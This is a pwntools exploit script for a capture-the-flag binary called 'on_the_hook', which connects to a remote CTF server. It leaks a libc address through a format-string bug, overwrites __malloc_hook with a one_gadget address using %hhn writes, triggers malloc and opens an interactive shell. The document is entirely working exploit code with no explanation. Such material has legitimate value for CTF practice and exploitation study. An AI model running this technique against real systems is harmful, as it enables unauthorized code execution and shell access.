from pwn import *

elf = ELF("./on_the_hook")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("ctf.k3rn3l4rmy.com", 2201)

def sl(s, d):
    target.sendlineafter(s, d)

sl(":", "%2$p..")

target.recvuntil("0x")
libc_base = int(target.recvuntil(".", drop=True), 0x10) - 0xf7efa5a0 + 0xf7d48000
log.info("LIBC Base: " + hex(libc_base))

gadgets = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6]
what = libc_base + gadgets[3]
where = libc_base + libc.sym['__malloc_hook']#0x1df818

payload = ""
cur = what & 0xff
payload += "%" + str(cur) + "c" + "%19$hhn"
what = what >> 8
payload += "%" + str(0x100 + what & 0xff - cur) + "c" + "%20$hhn"
what = what >> 8
payload += "A"*(0x30 - len(payload))
payload += p32(where) + p32(where+1)
sl(".", payload)


payload = ""
cur = what & 0xff
payload += "%" + str(cur) + "c" + "%19$hhn"
what = what >> 8
payload += "%" + str(0x100 + what & 0xff - cur) + "c" + "%20$hhn"
what = what >> 8
payload += "B"*(0x30 - len(payload))
payload += p32(where+2) + p32(where+3)
sl("A", payload)

sl("B", "%-99999999u")

target.interactive()